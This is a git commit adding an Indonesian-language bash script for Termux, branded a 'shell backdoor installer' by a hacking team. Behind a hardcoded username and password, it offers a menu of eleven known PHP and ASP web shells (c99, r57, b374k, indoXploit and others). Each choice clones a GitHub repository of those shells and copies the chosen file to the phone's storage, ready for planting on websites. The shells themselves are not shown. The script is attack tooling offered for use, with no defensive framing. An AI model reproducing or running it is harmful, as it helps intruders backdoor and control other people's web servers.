3dd33a88eedae377697469107abbd54e45713a10
ExplicitCyberTeam <46949775+ExplicitCyberTeam@users.noreply.github.com>
2019-02-16 09:49:28 +0700

    Add files via upload

---
+++ shell.sh
@@ -0,0 +1,263 @@
+#system/xbin/bash
+#Ngapa Lu Liat²
+#Ga Pernah Buat Tools Ya Sampe Recode Punya Orang Hahaha Kasian!!!!
+
+echo $red"Welcome To My Security"
+read -p "username : " user
+read -p "Password : " pass
+if [ $user = "ExGeneralTz" ] || [ $pass = "LnXploit" ]
+then
+clear
+echo "Login Success!"
+sleep 1
+clear
+else
+echo "Password Salah!!!"
+exit
+fi
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo $red "Terimakasih Sudah Menggunakan Tools Ini"
+sleep 1
+echo $white "Dan Sampai Jumpa Dilain Waktu"
+sleep 1
+echo $red "Byee - Byee "
+sleep 1
+exit
+}
+
+echo $red"Loading."
+sleep 0.5
+clear
+echo $yellow"Loading.."
+sleep 0.5
+clear
+echo $green"Loading..."
+sleep 0.5
+clear
+echo $red"Loading."
+sleep 0.5
+clear
+echo $yellow"Loading.."
+sleep 0.5
+clear
+echo $green"Loading..."
+sleep 0.5
+clear
+echo $red"Loading."
+sleep 0.5
+clear
+echo $yellow"Loading.."
+sleep 0.5
+clear
+echo $green"Loading..."
+sleep 0.5
+clear
+
+echo $white"—————————————————————————————————————————————————————————————————"
+echo $red"                  WELCOME TO SHELL BACKDOOR INSTALLER              "
+echo $white"—————————————————————————————————————————————————————————————————"
+echo $white"Author : EzGeneralTz"
+echo $white"Team   : Explicit Cyber Team - Insomnia Cyber Team"
+echo $white"       :           Underground Cyber Army"
+echo $white"Tipe   : SHELL BACKDOOR INSTALLER"
+echo $white"FB     : Satria Andhika Adi Saputro"
+echo $white"IG     : @andhika907"
+echo $white"——————————————————————————————————————————————————————————————————"
+echo $red"                 We Can Find You But You Can't Find Us.             "
+echo $white"——————————————————————————————————————————————————————————————————"
+date
+echo ""
+echo $white"Dipilih Mamank Shell Backdoornya"
+echo $white"1->indoXploit.php"
+echo $white"2->uca.php"
+echo $white"3->pacman.php"
+echo $white"4->minishell.php"
+echo $white"5->c99.php"
+echo $white"6->b374k.php"
+echo $white"7->andela.php"
+echo $white"8->r57.php"
+echo $white"Dibawah Ini Shell Yang Ber-Ext Asp"
+echo $white"9->newaspcmd.asp"
+echo $white"10->kacak.asp"
+echo $white"11->pouya.asp"
+echo $white"0->Pulang"
+read -p "[ExGeneralTz>" ex ;
+
+if [ $ex = 1 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD indoXploit.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f indoXploit.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 2 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD uca.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f uca.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 3 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD pacman.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f pacman.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 4 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD minishell.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f minishell.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 5 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD c99.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f c99.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 6 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD b374k.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f b374k.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 7 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD andela.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f andela.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 8 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD r57.php"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f r57.php /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 9 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD newaspcmd.asp"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f newaspcmd.asp /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 10 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD kacak.asp"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f kacak.asp /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 11 ]
+then
+clear
+echo $red"SEDANG MENDOWNLOAD pouya.asp"
+sleep 1
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/ExplicitCyberTeam/shell
+cd shell
+mv -f pouya.asp /sdcard
+echo $white"SHELL BACKDOOR OTOMATIS LANGSUNG ADA DI SDCARD"
+fi
+
+if [ $ex = 0 ]
+then
+clear
+echo $white"Cie Cie Yang Ga Punya Paketan"
+sleep 2
+echo $white"Apa Harus Gua Juga Yang Beliin :v"
+sleep 2
+echo $white"Yaudah Sana Beli Paketan Dulu :v"
+sleep 2
+echo $white"Entar Balik Lagi Yah Kalo Udh Punya Paketan :v"
+sleep 2
+exit
+fi
